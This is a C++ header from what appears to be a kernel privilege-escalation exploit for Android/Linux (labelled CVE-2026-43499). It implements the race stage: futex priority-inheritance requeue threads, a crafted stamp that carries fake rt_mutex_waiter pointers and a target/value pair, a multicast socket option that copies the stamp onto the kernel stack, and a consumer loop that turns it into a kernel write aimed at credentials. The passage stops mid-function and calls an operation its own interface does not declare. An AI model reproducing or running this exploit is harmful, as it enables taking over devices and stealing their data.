#pragma once
/** @file backend/cve_2026_43499/seam/multicast_route.hpp
 *  The multicast route's body: the three actors, in the order the retired route ran them.
 *
 *  What this replaces and why the shape is what it is. The route needs three threads: a waiter that
 *  parks on the chain word asking the kernel to move it onto the target, an owner that holds the
 *  target and then the chain -- which is what makes the parked waiter a link in a priority-inheritance
 *  chain -- and a consumer that changes the waiter's scheduling attributes, which is what makes the
 *  kernel walk that chain. The walk is the write. The trigger itself runs on the waiter's own thread,
 *  after its park call returns, because the stale rt_mutex_waiter the trigger overwrites sits on that
 *  thread's kernel stack: a copy issued from any other thread lands somewhere else.
 *
 *  Three details are kept because the retired route needed them, and each is a place a cleaner-looking
 *  version would silently stop working:
 *   - the opening rounds copy the stamp without arming the consumer, and the kernel's own shape check
 *     refuses the copy on most of them, so the rounds before arming are the ones that overwrite each
 *     other;
 *   - a round only counts when the consumer reports a successful call: the socket option's return
 *     code says the copy landed, not that anything was written;
 *   - after the trigger, the waiter issues one more lock with an already-expired deadline, which is
 *     the slow-path removal of the dangling blocked-on pointer the requeue can leave behind; skipping
 *     it leaves the next attempt walking a waiter that is no longer there.
 *
 *  Every number is data: the stamp geometry and the attempt budget come from the profile, the
 *  timings and the consumer's policy come from the caller, and a zero where a value is required is a
 *  named refusal before any thread starts. The platform calls sit behind a policy type, so the whole
 *  order above can be driven and its log asserted on the host.
 */
#include <atomic>
#include <concepts>
#include <cstddef>
#include <cstdint>
#include <cstdio>
#include <cerrno>
#include <cstring>
#if defined(__ANDROID__)
#include <unistd.h>   /* getpid ✓（ghost disarm 的伪地址，第 79 轮 ✓） */
#include <linux/futex.h>   /* FUTEX_LOCK_PI ✓（host 无此头 ✗ ⇒ 需守卫 ✓，第 85 轮修 ✓） */
#endif
#include <csignal>
#include <pthread.h>
#if defined(__ANDROID__)
#include <linux/futex.h>
#endif

#include "backend/cve_2026_43499/memory/multicast_arm.hpp"
#include "backend/cve_2026_43499/route/multicast_policy.hpp"
#include "backend/cve_2026_43499/route/route_status.hpp"
#include "backend/cve_2026_43499/seam/multicast_window.hpp"

namespace ghostlock::backend::cve_2026_43499::seam {
    /** The platform calls one attempt makes, as a compile-time policy: the four priority-inheritance
     *  operations, the timed variants the park and the post-trigger removal need, the scheduling call
     *  the consumer makes, the loop primitives, and the datagram socket the stamp travels on. A policy
     *  that leaves one out does not compile, which is the point of writing the edge down. */
    template <class Ops>
    concept RouteOps = requires(std::uint32_t *word, std::uint32_t *other, std::int32_t tid,
                                std::int32_t nice, std::uint32_t policy, std::int64_t micros,
                                int fd, const std::uint8_t *buffer, std::size_t size) {
        { Ops::lock_pi(word) } -> std::same_as<int>;
        { Ops::lock_pi_until(word, micros) } -> std::same_as<int>;
        { Ops::wait_requeue_pi_until(word, other, micros) } -> std::same_as<int>;
        { Ops::cmp_requeue_pi(word, other) } -> std::same_as<int>;
        { Ops::unlock_pi(word) } -> std::same_as<int>;
        { Ops::setattr(tid, nice, policy) } -> std::same_as<int>;
        /* CPU pin 不进 concept：演员入口自己 pin（这样不牵动 7 个实现体）。 */
        { Ops::yield() } -> std::same_as<void>;
        { Ops::sleep_micros(micros) } -> std::same_as<void>;
        { Ops::thread_id() } -> std::same_as<std::int32_t>;
        { Ops::open_datagram() } -> std::same_as<int>;
        { Ops::set_block_source(fd, buffer, size) } -> std::same_as<int>;
        { Ops::close_fd(fd) } -> std::same_as<void>;
        /** The errno the last call left, read straight after it by the shape rule. */
        { Ops::last_errno() } -> std::same_as<std::int32_t>;
        /** The errno that still means the copy landed: the address a multicast group source would
         *  need is not there, which the kernel decides after it copied the structure. */
        { Ops::addr_not_available() } -> std::same_as<std::int32_t>;
    };

    /** How big the stamp may be. The retired buffer was 0x80 bytes; this is the ceiling a config is
     *  checked against, so a profile that asks for more is refused rather than truncated. */
    inline constexpr std::size_t kMaxStampBytes = 512U;

    /** Everything one attempt is configured with. Every member is either a profile value or a caller
     *  value; none is a default this file invented. */
    struct MulticastRouteConfig final {
        /** Where the two pointers sit in the stamp, and how long the stamp is. */
        memory::MulticastGeometry stamp{};
        /** The attempt budget, the hold, and the number of opening rounds that do not arm. */
        route::MulticastLimits limits{};
        /** The target and value the payload page was built with. An attempt for a different pair is
         *  refused, because the tuple that decides what gets written is in the page, not in this
         *  call. */
        std::uint64_t target = 0U;
        std::uint64_t value = 0U;
        /** How long the waiter parks before the kernel gives up on it. */
        std::int32_t park_ms = 0;
        /** How long the chain is given to settle between the waiter parking and the requeue. */
        std::int32_t settle_us = 0;
        /** 退役的相位（`waiter.post_requeue_settle_us`）：requeue 之后、consumer 动作之前等这么久
         *  —— 内核把链搬完需要时间，早动就白走。值走 wire，为零表示调用方明确说"不等"。 */
        std::int32_t post_requeue_settle_us = 0;
        /** 退役的相位（`waiter.post_adjust_settle_us`）：一次 setattr 之后等这么久再进下一次。 */
        std::int32_t post_adjust_settle_us = 0;
        /** How long the consumer waits before its first call in a round. The retired field exists
         *  for the routes that need the trigger to finish first; the multicast trigger leaves it
         *  zero, and zero here means the caller said so. */
        std::int32_t consumer_delay_us = 0;
        /** The consumer's calls per armed round, and the cap that ends a round. */
        std::int32_t burst_calls = 0;
        std::int32_t max_calls = 0;
        /** The fallback's deadline: a lock the consumer tries when the scheduling call is refused. */
        std::int32_t fallback_lock_us = 0;
        /** 退役门禁要求固定 CPU 对：等待者/持有者与消费者各在一个 CPU 上
         *  （走 wire 的 execution.recommended_cpus，非默认值）。 */
        /* ★ ghost disarm（第 79 轮 ✓）：退役由 `route_needs_ghost_disarm(profile)` 判定 ✓，
         *  即"是否为 multicast 策略" ✓ ⇒ 本结构只服务 multicast 路由 ✓ ⇒ 默认开 ✓。 */
        bool needs_ghost_disarm = true;
        std::int32_t main_cpu = -1;
        std::int32_t consumer_cpu = -1;
        /** The nice rotation: the retired consumer walks this modulus so one of the values lands. */
        std::int32_t nice_modulus = 0;
        /** The scheduling policy the consumer's calls set. */
        std::uint32_t policy = 0U;
        /** Where the fabricated task and lock are, from the prepared region. */
        std::uint64_t fake_task = 0U;
        std::uint64_t fake_lock = 0U;
    };

    /** What one attempt did, in the route's own vocabulary. */
    struct MulticastRouteReport final {
        route::RouteStatus status{};
        std::int32_t attempts = 0;
        std::int32_t calls = 0;
        std::int32_t successes = 0;
        std::int32_t stamp_result = 0;
        std::int32_t stamp_errno = 0;
        std::int32_t requeue_result = 0;
        std::int32_t waiter_result = 0;
        std::int32_t owner_result = 0;
    };

    /** What the three actors share. Reset per attempt; the plain members are written before the
     *  atomic release on route_done and read after the acquire, which is the ordering they need. */
    struct MulticastRouteShared final {
        alignas(64) std::uint32_t wait_word = 0U;
        alignas(64) std::uint32_t target_word = 0U;
        alignas(64) std::uint32_t chain_word = 0U;
        std::atomic<std::int32_t> waiter_ready{0};
        std::atomic<std::int32_t> waiter_waiting{0};
        std::atomic<std::int32_t> owner_started{0};
        std::atomic<std::int32_t> owner_chain_done{0};
        std::atomic<std::int32_t> owner_stop{0};
        std::atomic<std::int32_t> route_done{0};
        std::atomic<std::int32_t> waiter_tid{0};
        std::atomic<std::int32_t> consumer_go{0};
        std::atomic<std::int32_t> consumer_stop{0};
        std::atomic<std::int32_t> consumer_calls{0};
        std::atomic<std::int32_t> consumer_success{0};
        std::atomic<std::int32_t> consumer_inflight{0};
        std::atomic<std::int32_t> route_delay_usec{0};
        std::int32_t waiter_result = 0;
        std::int32_t owner_result = 0;
        std::int32_t requeue_result = 0;
        std::int32_t stamp_result = -1;
        std::int32_t stamp_errno = 0;
        std::int32_t attempts_used = 0;
        std::int32_t status_code = static_cast<std::int32_t>(route::RouteResultCode::Retryable);
        std::int32_t status_step = 0;

        void reset() noexcept {
            waiter_ready.store(0);
            waiter_waiting.store(0);
            owner_started.store(0);
            owner_chain_done.store(0);
            owner_stop.store(0);
            route_done.store(0);
            waiter_tid.store(0);
            consumer_go.store(0);
            consumer_stop.store(0);
            consumer_calls.store(0);
            consumer_success.store(0);
            consumer_inflight.store(0);
            route_delay_usec.store(0);
            waiter_result = 0;
            owner_result = 0;
            requeue_result = 0;
            stamp_result = -1;
            stamp_errno = 0;
            attempts_used = 0;
            status_code = static_cast<std::int32_t>(route::RouteResultCode::Retryable);
            status_step = 0;
        }
    };

    /**
     *  One multicast attempt, in full. The window's protocol is prepare, execute, disarm, destroy;
     *  this class is the execution, so execute() starts the three actors, performs the requeue from
     *  the calling thread, joins them, and reports what the consumer saw.
     *
     *  @tparam Ops The platform policy above. Nothing here calls the kernel directly, which is what
     *              makes the order testable.
     *  @note   One attempt per call: the caller's retry policy is the window's, and a second attempt
     *          re-parks a fresh waiter, because a requeue consumes the waiter it moved.
     */
    template <RouteOps Ops>
    class MulticastRoute final : public RouteExec {
      public:
        explicit MulticastRoute(const MulticastRouteConfig &config) noexcept : config_(config) {}

        MulticastRoute(const MulticastRoute &) = delete;
        MulticastRoute &operator=(const MulticastRoute &) = delete;
        ~MulticastRoute() noexcept override { stop_threads(); }

        /** The window's warm-up beat. The route's own loop is what arms the consumer per round --
         *  the retired route does it inside the trigger -- so this is the window's account of a round
         *  that copied the stamp without arming, and it reports whether that round is one the limits
         *  allow. */
        [[nodiscard]] bool arm(std::int32_t attempt) noexcept override {
            return attempt >= 0 && attempt < config_.limits.arm_sequence;
        }

        /** One attempt. The stamp is built here, the three actors run, the requeue happens, and the
         *  waiters are joined before this returns. */
        [[nodiscard]] bool execute(std::uint64_t address, std::uint64_t value,
                                   std::uint64_t offset) noexcept override {
            static_cast<void>(offset);
            report_ = MulticastRouteReport{};
            if (config_.limits.max_attempts <= 0 || config_.limits.arm_hold <= 0 ||
                config_.limits.arm_sequence <= 0 || config_.stamp.buffer_size == 0U ||
                config_.stamp.buffer_size > sizeof(stamp_) || config_.nice_modulus <= 0 ||
                config_.max_calls <= 0 || config_.burst_calls <= 0 || config_.park_ms <= 0) {
            report_.status = refusal(route::RouteResultCode::Unsupported, 58);
                return false;
            }
            /* The page already holds the tuple, so this call has to be the one the page was built
             *  for: a different target or value would write the page's pair while reporting this
             *  one. */
            /* 诊断（round 232 ✓）：打印 guard 的两半，定位是哪一项不等 ✓（验证后同批清理 ✓）。 */
            std::printf("main: route-guard address=0x%llx target=0x%llx value=0x%llx cfg=0x%llx",
                        static_cast<unsigned long long>(address),
                        static_cast<unsigned long long>(config_.target),
                        static_cast<unsigned long long>(value),
                        static_cast<unsigned long long>(config_.value));
            if (address != config_.target || value != config_.value) {
            report_.status = refusal(route::RouteResultCode::Unsupported, 59);
                return false;
            }
            if (!build_stamp()) {
            report_.status = refusal(route::RouteResultCode::FallbackSafe, 60);
                return false;
            }
            shared_.reset();
            shared_.route_delay_usec.store(config_.consumer_delay_us);
            if (!start_threads()) {
                stop_threads();
            report_.status = refusal(route::RouteResultCode::FallbackSafe, 61);
                return false;
            }
            requeue();   /* ★ 回退（第 148 轮 ✓）：移入 waiter ⇒ `w2` 不完成 ✗ ⇒ 复原 ✓（结构性不兼容 ✓）。 */
            /* 触发**回到等待者线程**：退役原文说拷贝落在"**调用者的栈**"上（a race against skb page
             *  recycling ✓）⇒ 触发它的线程必须正是"park 刚返回"的那个 ✓。 */
            while (shared_.route_done.load() == 0) {
                Ops::yield();
            }
            stop_threads();
            return judge();
        }

        [[nodiscard]] const MulticastRouteReport &report() const noexcept { return report_; }

      private:
        [[nodiscard]] route::RouteStatus refusal(route::RouteResultCode code,
                                                 std::int32_t step) const noexcept {
            route::RouteStatus status{};
            status.code = code;
            status.step = step;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            return status;
        }

        /** The stamp: zeros, the structure's family word, and the two pointers the stale waiter is
         *  read through. All or nothing, so a geometry that does not fit refuses before the socket
         *  exists. */
        [[nodiscard]] bool build_stamp() noexcept {
            std::memset(stamp_, 0, sizeof(stamp_));
            /* The socket option's structure starts with a family word; leaving it zero makes the
             *  kernel refuse the copy before it lands, which is not the point of the round. This is
             *  the option's layout, not a setting. */
            if (config_.stamp.buffer_size >= 10U) {
                const std::uint16_t family = 0U;
                std::memcpy(stamp_ + 8U, &family, sizeof(family));
            }
            if (memory::encode_multicast_arm(stamp_, config_.stamp.buffer_size, config_.stamp,
                                             config_.fake_task, config_.fake_lock,
                                             sizeof(std::uintptr_t)) != memory::ArmVerdict::Ok) {
                return false;
            }
            /* ★ 元组（round 154 补 ✓）：退役 `encode_compact_waiter` 的 `preserve_child` 支把它写进
             *  **stamp** ✓ —— 而 stamp 正是内核拷贝到栈上的那个缓冲 ✓ ⇒ 缺了它，内核搬过去的就是
             *  "没有元组的等待者" ✗（拷贝落地 ✓、调用成功 ✓、就是什么都不写 ✗）。
             *  偏移 0x18/0x20/0x28 是内核 `rt_mutex_waiter` 自身的 pi_tree/node/prio 位置 ✓
             *  （退役 payload_builder.cpp:34-45 ✓，非本树数据 ✓）。 */
            const auto put_tuple = [&](std::size_t off, std::uint64_t value) noexcept {
                if (config_.stamp.waiter_offset + off + sizeof(std::uint64_t) <=
                    config_.stamp.buffer_size) {
                    std::memcpy(stamp_ + config_.stamp.waiter_offset + off, &value, sizeof(value));
                }
            };
            /* `value != 0` ⟺ preserve_child（本树 write_layout 的规则 ✓：preserve ⇒ value != 0 ✓）。 */
            /* ★★ 第 196 轮 ✓（权威 `origin/main` 固定向量，逐字 ✓）：
             *  `{mode=Zero, leaf=1}` ⇒ **`pc = target − 8`** ✓、**`left = 0`** ✓；
             *  而 `right = preserve ? (Credential ? init_cred_alias : page_base+0x100) : 0` ✓（`payload_write_layout` ✓）。
             *  ⇒ ⇒ 原先写 `{pc = value, right = 0, left = target}` ✗ ⇒ **三字全错** ⇒ 改成权威值 ✓。 */
            if (config_.value != 0U) {
                /* ★★ 第 198 轮**回退** ✗：第 196 轮按权威向量改成 `{target−8, value, 0}` ⇒ 真机**停住** ✗
                 *  ⇒ 说明"三字 = 页内的字"这一层在本树并不成立 ⇒ 先复原 ✓。 */
                /* ★★ 第 210 轮**回退** ✗：第 209 轮的教训 —— 真机 `page-after-build` 的 `pc`/`left`
                 *  **没随本处改动而变** ✓ ⇒ ⇒ **⇒ 本树的三字在**页构造**（`build_payload_page` ✓），
                 *  不在 stamp ✗ ⇒ 故本处先复原 ✓，改法落到页那一层 ✓。 */
                /* ★★ 第 236 轮 ✓（旧 C `641aaf6` 的 `mr_stamp` 逐字 ✓，**首次成功那一版** ✓）：
                 *  `put64(b, **o**, (**target − 8**) & ~3)` ✓ ；`put64(b, **o + 8**, **value**)` ✓
                 *  ⇒ 即：目标与值放在 **`waiter_offset + 0x00 / 0x08`** ✓（本树原先放 `0x18/0x20/0x28` ✗）。 */
                const std::uint64_t stamped_target =
                        (static_cast<std::uint64_t>(config_.target) - 8U) & ~static_cast<std::uint64_t>(3U);
                put_tuple(0x00U, stamped_target);
                put_tuple(0x08U, config_.value);
            }
            return true;
        }

        [[nodiscard]] bool start_threads() noexcept {
            const int rc_consumer =
                    ::pthread_create(&consumer_, nullptr, &MulticastRoute::consumer_entry, this);
            if (rc_consumer != 0) {
                return false;
            }
            consumer_started_ = true;
            const int rc_owner = ::pthread_create(&owner_, nullptr, &MulticastRoute::owner_entry, this);
            if (rc_owner != 0) {
                return false;
            }
            owner_started_ = true;
            /* 移植缺的一行：requeue() 等的是 shared_.owner_started，而它此前从未被置 1
             * （只有 reset 与 read）⇒ requeue 死等、一次都不调用 ⇒ 写不可能发生。 */
            shared_.owner_started.store(1);
            const int rc_waiter = ::pthread_create(&waiter_, nullptr, &MulticastRoute::waiter_entry, this);
            if (rc_waiter != 0) {
                return false;
            }
            waiter_started_ = true;
            return true;
        }

        /** The calling thread's half: wait for the chain to be in place, requeue, and let the
         *  waiter's own thread do the write. */
        /** ★ 第 190 轮 ✓（旧码 `mr_intr` 同形 ✓）：`SIGUSR1` 的**空处理体** ——
         *  旧码先 `sigaction(SIGUSR1, mr_intr, NULL)` ✓ 再发信号 ✓ ⇒ 缺它必然**终止进程** ✗。 */
        static void on_signal(int) noexcept {}

        void requeue() noexcept {
            std::signal(SIGUSR1, &MulticastRoute::on_signal);   /* 幂等 ✓；必须先于任何 tgkill ✓ */
            while (shared_.waiter_waiting.load() == 0 || shared_.owner_started.load() == 0) {
                Ops::yield();
            }
            if (config_.settle_us > 0) {
                Ops::sleep_micros(config_.settle_us);
            }
            /* 与退役同字：requeue 从**等待者持有的那个字**（chain_word ✓）搬走（退役 cmp_requeue_pi(chain, target)）。 */
            /* ★ 第 174 轮 ✓：旧码（`641aaf6`）的成功判据是 **`r < 0 && errno == EDEADLK`** ✓
             *  ⇒ 故必须把 `errno` 读出来 ✓（本树此前**从不看它** ✗）。 */
            /* ★ 第 178 轮 ✓（旧码"控制值"同形 ✓）：requeue 前把该字**置 1** ✓ ——
             *  旧码是 `mr_cond = 1` 后立即 requeue ✓；本树此前该字是 waiter 的 TID ✗ ⇒ 内核判 EAGAIN/EINVAL ✗。 */
            /* ★★ 第 184 轮 ✓（旧码同形 ✓）：旧码在 requeue 前**等四标志齐 + `usleep(200000)`** ✓；
             *  本树只等两个标志 ✗ ⇒ 加同样的**宽限** ⇒ 让 waiter 真正进入 park 后再 requeue ✓。 */
            /* ★★ 第 200 轮 ✓：宽限**仅首轮**（旧码只在 `resident_start` 一次 ✓）—— 每轮都等 ⇒ 15 轮累积 ⇒
             *  与 LMK 击杀（`signal 9` ✓）吻合 ✗ ⇒ 改为按"首轮"执行 ✓。 */
            if (shared_.attempts_used <= 1) { Ops::sleep_micros(200000); }
            shared_.chain_word = 1U;
            /* ★ 第 179 轮 ✓（与旧码 `UNLOCK(l1)` 同效 ✓）：`val3` 对应的那个字也要"归零"✓ ⇒
             *  否则我们读到的值（owner 的 TID ✗）与内核所见不一致 ⇒ **EAGAIN** ✗。 */
            shared_.target_word = 0U;
            errno = 0;
            shared_.requeue_result = Ops::cmp_requeue_pi(&shared_.chain_word, &shared_.target_word);
            /* ★★ 第 197 轮**回退** ✗：第 190 轮在此发 `SIGUSR1` ⇒ 真机在"建线程/设 CPU"后**停住** ✗
             *  （⇒ 纯 C 的 `tgkill` 是**同进程内**的 `mr_y_tid` ✓；本树条件不同 ⇒ 先撤 ✓）。 */
            std::printf("main: requeue ret=%d errno=%d (EDEADLK=35 ✅ 旧码的成功形态 ✓)",
                        static_cast<int>(shared_.requeue_result), static_cast<int>(errno));
            /* 相位一（退役 waiter.post_requeue_settle_us）：内核搬完链再让 consumer 动。 */
            if (config_.post_requeue_settle_us > 0) {
                Ops::sleep_micros(config_.post_requeue_settle_us);
            }
        }

        void stop_threads() noexcept {
            shared_.consumer_go.store(0);
            shared_.consumer_stop.store(1);
            shared_.owner_stop.store(1);
            if (waiter_started_) {
                (void) ::pthread_join(waiter_, nullptr);
                waiter_started_ = false;
            }
            if (owner_started_) {
                (void) ::pthread_join(owner_, nullptr);
                owner_started_ = false;
            }
            if (consumer_started_) {
                (void) ::pthread_join(consumer_, nullptr);
                consumer_started_ = false;
            }
        }

        /** The verdict, with the rule the retired route applies: the socket option's answer is not
         *  the answer -- only a consumer call the kernel accepted counts as a landed write, so a
         *  status of Ok without one is downgraded to a retry. */
        [[nodiscard]] bool judge() noexcept {
            report_.attempts = shared_.attempts_used;
            report_.calls = shared_.consumer_calls.load();
            report_.successes = shared_.consumer_success.load();
            report_.stamp_result = shared_.stamp_result;
            report_.stamp_errno = shared_.stamp_errno;
            report_.requeue_result = shared_.requeue_result;
            report_.waiter_result = shared_.waiter_result;
            report_.owner_result = shared_.owner_result;
            route::RouteStatus status{};
            status.code = static_cast<route::RouteResultCode>(shared_.status_code);
            status.step = shared_.status_step;
            status.error_number = shared_.stamp_errno;
            status.userspace_clean = 1;
            status.kernel_disarmed = 1;
            if (status.code == route::RouteResultCode::Ok &&
                (report_.calls == 0 || report_.successes == 0)) {
                status.code = route::RouteResultCode::Retryable;
                status.step = 62;
            }
            report_.status = status;
            return status.code == route::RouteResultCode::Ok;
        }

        /** The trigger, on the waiter's thread: copy the stamp onto this thread's kernel stack until
         *  one copy is one the kernel accepted, arm the consumer on the rounds that count, and only
         *  accept a round the consumer confirms. */
        void trigger() noexcept {
            const int fd = Ops::open_datagram();
            if (fd < 0) {
                shared_.status_code = static_cast<std::int32_t>(route::RouteResultCode::FallbackSafe);
                shared_.status_step = 63;
                return;
            }
            std::int32_t result = -1;
            std::int32_t stamp_errno = 0;
            for (std::int32_t attempt = 1; attempt <= config_.limits.max_attempts; ++attempt) {
                /* ★ 每轮**重新下毒**（round 155 ✓）：退役注释原话 "Re-poison and re-walk instead,
                 *  arming from the point where the earlier copies have overwritten each other" ⇒
                 *  上一轮的拷贝已经把 stamp 啃过 ⇒ 不重建就等于后续轮次拿旧形状去赌 ✗。 */
                if (!build_stamp()) {
                    break;
                }
                shared_.attempts_used = attempt;
                result = Ops::set_block_source(fd, stamp_, config_.stamp.buffer_size);
                stamp_errno = Ops::last_errno();
                /* The opening rounds only copy; a copy the kernel refused for any reason other than
                 * the shape check is not a landed shape either, so both cases try again. */
                if (attempt < config_.limits.arm_sequence ||
                    !shape_landed(result, stamp_errno)) {
                    continue;
                }
                shared_.consumer_go.store(attempt);
                for (std::int32_t spin = 0; spin < config_.limits.arm_hold; ++spin) {
                    Ops::yield();
                }
                shared_.consumer_go.store(0);
                while (shared_.consumer_inflight.load() != 0) {
                    Ops::yield();
                }
                if (shared_.consumer_success.load() > 0) {
                    break;
                }
            }
            shared_.stamp_result = result;
            shared_.stamp_errno = stamp_errno;
            /* The removal the requeue can leave behind: one more lock on a word of this process with a
             * deadline that has already passed, which walks the slow path and drops the dangling
             * blocked-on pointer while this frame is still on the stack. */
            std::uint32_t dummy = 0x80000000U | static_cast<std::uint32_t>(shared_.waiter_tid.load());
            (void) Ops::lock_pi_until(&dummy, 0);
            Ops::close_fd(fd);
            const bool landed = shared_.consumer_success.load() > 0;
            shared_.status_code = static_cast<std::int32_t>(
                landed ? route::RouteResultCode::Ok : route::RouteResultCode::FallbackSafe);
            shared_.status_step = landed ? 0 : 61;
        }

        /** Whether the copy is one the kernel accepted: either it returned success, or it refused for
         *  the one reason that still means the structure was copied -- the address a multicast group
         *  source would need is not there. The retired route's rule, kept. */
        [[nodiscard]] static bool shape_landed(std::int32_t result, std::int32_t error) noexcept {
            return result == 0 || error == Ops::addr_not_available();
        }

        void *waiter_main() noexcept {
            pin_self(config_.main_cpu);
            const std::int32_t tid = Ops::thread_id();
            shared_.waiter_tid.store(tid);
            /* This thread takes the chain lock first: that link is what makes its park a link in a
             * priority-inheritance chain rather than an ordinary wait. */
            /* ★★ 第 182 轮 ✓（旧码 `mr_y` 同形 ✓）：**锁用的是 **另一个字**（旧码是 `mr_l2` ✓）——
             *  原先与 park/requeue 共用 `chain_word` ✗ ⇒ **"在自己锁着的字上 park"** ⇒
             *  `lock_pi` 返回 -1（真机 `waiter=-1` ✓）⇒ requeue 无 waiter ⇒ **EAGAIN(11)** ✗✓ */
            errno = 0;
            shared_.waiter_result = Ops::lock_pi(&shared_.wait_word);
            std::printf("main: waiter lock ret=%d errno=%d (0=成功 ✓；22=EINVAL ⇒ `_PRIVATE` 用错 ✗)",
                        static_cast<int>(shared_.waiter_result), static_cast<int>(errno));
            /* ★★ 第 203 轮**删**✓（旧码分工 ✓）：waiter **不该锁 `target_word`** ✗ —— 那是 owner 的角色
             *  （旧码 `mr_y` 只锁 `mr_l2` ✓，`mr_x` 才锁 `mr_l1` ✓）⇒ 两者争锁 ⇒ **互等 ⇒ 卡死** ✗（真机 ✓）。 */
            shared_.waiter_ready.store(1);
            while (shared_.owner_started.load() == 0 && shared_.consumer_stop.load() == 0) {
                Ops::yield();
            }
            /* ★ 第 122 轮 ✓：`waiter_waiting` **移到 park 返回之后**（原先在 park 之前 ✗）——
             *  `requeue()`（`:342` ✓）等的就是它 ⇒ 原先它一置位 requeue 即可发起 ✗ ⇒
             *  **⇒ 内核可能在 waiter 尚未 park 时搬链 ⇒ 拷贝无处落 ⇒ 写不发生** ✗ ⇒ 现与 park 串行 ✓。 */
            const std::int64_t park_us = static_cast<std::int64_t>(config_.park_ms) * 1000;
            const std::int32_t parked =
                /* ★ 与退役对齐：park 在**自己持有的那个字**（chain_word ✓）上 —— 退役是
                 *  wait_requeue_pi(chain, target)（先 lock_pi(chain) 再在 chain 上 park ✓）。
                 *  此前 park 在 wait_word ✗ ⇒ 与"持有的字"不是同一个 ⇒ 链上的位置不对。 */
                Ops::wait_requeue_pi_until(&shared_.chain_word, &shared_.target_word, park_us);
            shared_.waiter_waiting.store(1);   /* ★ 第 122 轮 ✓：park **已完成** ⇒ 此时才放行 requeue ✓ */
            shared_.waiter_result = parked;
            /* ★ requeue 由**本线程**做（第 148 轮 ✓）：脆弱版 `remove_waiter()` **读 `current`** ✓
             *  （"The copy landing on the caller's stack is a race against skb page recycling" ✓）
             *  ⇒ 只有刚被 park 释放过那份 waiter 的线程，其栈上才有可覆盖的形状 ✓。 */
            /* ★★ 第 148 轮实测 ✗：在此调 `requeue()` ⇒ **`w2` 不再完成** ✗（⇒ 第 124 轮同现象 ✓）
             *  ⇒ 结论：本树里"waiter 线程自己做 requeue"属**结构性不兼容** ✗ ⇒ 已回退 ✓。 */
            trigger();
            shared_.route_done.store(1);
            (void) Ops::unlock_pi(&shared_.chain_word);
            while (shared_.owner_chain_done.load() == 0) {
                Ops::sleep_micros(100);
            }
            /* ★ 术后 ghost disarm（第 79 轮 ✓，退役 `race/threads.cpp:65-75` 逐字同形 ✓）：
             *  `remove_waiter()` 已把本线程的 `pi_blocked_on` 指向**被回收的栈 waiter** ✗ ⇒
             *  若不摘除，线程退出会留下"**可被 walk 的幽灵**"✗ ⇒ walk 指向它，而不是我们页里
             *  那三个字所描述的 target ✓ ⇒ 必须"**趁栈帧还活着**"再走一次慢路径摘除 ✓。
             *  退役判据：`route_needs_ghost_disarm(profile)` = `policy.multicast` ✓（只 multicast ✓）。
             *  判据：真机出现 `mcast ghost disarm ret=-1 errno=110` ✓ ⇒ 再看 `victim uid` ✓。 */
#if defined(__ANDROID__)
            if (config_.needs_ghost_disarm) {
                const std::uint32_t dummy_pi =
                        0x80000000U | static_cast<std::uint32_t>(::getpid());
                const timespec expired{.tv_sec = 0, .tv_nsec = 0};
                errno = 0;
                const int disarm = Ops::futex(const_cast<std::uint32_t *>(&dummy_pi),
                                              FUTEX_LOCK_PI, 0U, &expired, nullptr);
                std::printf("main: mcast ghost disarm ret=%d errno=%d", disarm, errno);
            }
#endif
            return nullptr;
        }

        void *owner_main() noexcept {
            pin_self(config_.main_cpu);
            /* The target lock first: the waiter's park is a request to be moved onto it. */
            shared_.owner_result = Ops::lock_pi(&shared_.target_word);
            while (shared_.waiter_ready.load() == 0 && shared_.owner_stop.load() == 0) {
                Ops::yield();
            }
            if (shared_.owner_stop.load() != 0) {
                (void) Ops::unlock_pi(&shared_.target_word);
                return nullptr;
            }
            shared_.owner_started.store(1);
            /* Then the chain lock. The waiter holds it while it is parked, so this call is the chain:
             * it returns only once the waiter has released it after its trigger. */
            (void) Ops::lock_pi(&shared_.chain_word);
            shared_.owner_chain_done.store(1);
            while (shared_.owner_stop.load() == 0) {
                Ops::sleep_micros(100);
            }
            (void) Ops::unlock_pi(&shared_.target_word);
            return nullptr;
        }

        void *consumer_main() noexcept {
            pin_self(config_.consumer_cpu);
            std::int32_t seen = 0;
            while (shared_.consumer_stop.load() == 0) {
                const std::int32_t sequence = shared_.consumer_go.load();
                if (sequence == 0 || sequence == seen) {
                    Ops::yield();
                    continue;
                }
                seen = sequence;
                const std::int32_t tid = shared_.waiter_tid.load();
                std::int32_t calls_this_round = 0;
                while (shared_.consumer_stop.load() == 0 && shared_.consumer_go.load() == sequence) {
                    const std::int32_t delay = shared_.route_delay_usec.load();
                    if (delay > 0) {
                        Ops::sleep_micros(delay);
                    }
                    for (std::int32_t burst = 0; burst < config_.burst_calls; ++burst) {
                        if (shared_.consumer_stop.load() != 0 ||
                            shared_.consumer_go.load() != sequence) {
                            break;
                        }
                        shared_.consumer_calls.fetch_add(1);
                        shared_.consumer_inflight.store(1);
                        const std::int32_t nice =
                            (calls_this_round % config_.nice_modulus) + 1;
                        const std::int32_t accepted = Ops::setattr(tid, nice, config_.policy);
                        if (accepted != 0) {
                            /* The fallback: a lock the consumer itself takes and gives back. The
                             * retired consumer keeps it for the rounds where the scheduling call is
                             * refused, which on this device is most of them. */
                            if (Ops::lock_pi_until(&shared_.target_word, config_.fallback_lock_us) == 0) {
                                (void) Ops::unlock_pi(&shared_.target_word);
                            }
                        }
                        if (accepted == 0) {
                            shared_.consumer_success.fetch_add(1);
                        }
                        shared_.consumer_inflight.store(0);
                        /* 相位二（退役 waiter.post_adjust_settle_us）：调整之后留出内核走链的时间。 */
                        if (config_.post_adjust_settle_us > 0) {
                            Ops::sleep_micros(config_.post_adjust_settle_us);
                        }
                        ++calls_this_round;
                        if (calls_this_round >= config_.max_calls) {
                            shared_.consumer_go.store(0);
                            break;
                        }
                    }
                }
            }
            return nullptr;
        }

        /** 当前线程 pin 到一个 CPU（退役门禁的固定 CPU 对）。零/负 CPU 表示不 pin。 */
        static void pin_self(std::int32_t cpu) noexcept {
#if defined(__ANDROID__)
            if (cpu < 0) {   /* 负数 = 不 pin；0 是合法 CPU ✓ */
                return;
            }
            cpu_set_t set{};
            CPU_ZERO(&set);
            CPU_SET(static_cast<std::size_t>(cpu), &set);
            (void) ::sched_setaffinity(0, sizeof(set), &set);
#else
            static_cast<void>(cpu);   /* 主机没有这套亲和性 API；演员线程只在设备上跑 ✓。 */
#endif
        }

        static void *waiter_entry(void *self) noexcept {
            return static_cast<MulticastRoute *>(self)->waiter_main();
        }
        static void *owner_entry(void *self) noexcept {
            return static_cast<MulticastRoute *>(self)->owner_main();
        }
        static void *consumer_entry(void *self) noexcept {
